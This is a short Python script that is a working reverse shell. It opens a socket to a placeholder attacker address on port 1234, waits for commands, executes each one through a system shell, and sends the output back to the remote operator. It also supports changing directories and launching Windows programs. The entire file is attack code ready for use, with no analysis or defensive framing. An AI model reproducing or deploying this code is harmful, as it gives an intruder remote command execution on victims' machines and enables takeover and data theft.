import subprocess
import socket
import os

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("ATTACKER IP ADDRES", 1234)) # Change 'ATTACKER IP ADDRES' Placeholder

    app_cmds = ["notepad", "calc"]

    while True:
        command = s.recv(1024).decode()
        if command != "":
            if len(command) >= 2 and command[0:2] == "cd":
                try:
                    os.chdir(command[3:])
                    s.send("[+] Changed Directory Succesfully!".encode())
                except:
                    s.send("[-] Directory Not Found!".encode())
            elif command != "quit" and command not in app_cmds:
                execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                result = execute.stdout.read() + execute.stderr.read()
                result = result.decode()
                s.send(result.encode())
            elif command in app_cmds:
                execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                s.send(f"[+] Executed {command} Succesfull!".encode())
            else:
                s.close()
                break
        else:
            s.send("Invalid Command".encode())
except ConnectionAbortedError:
    quit()
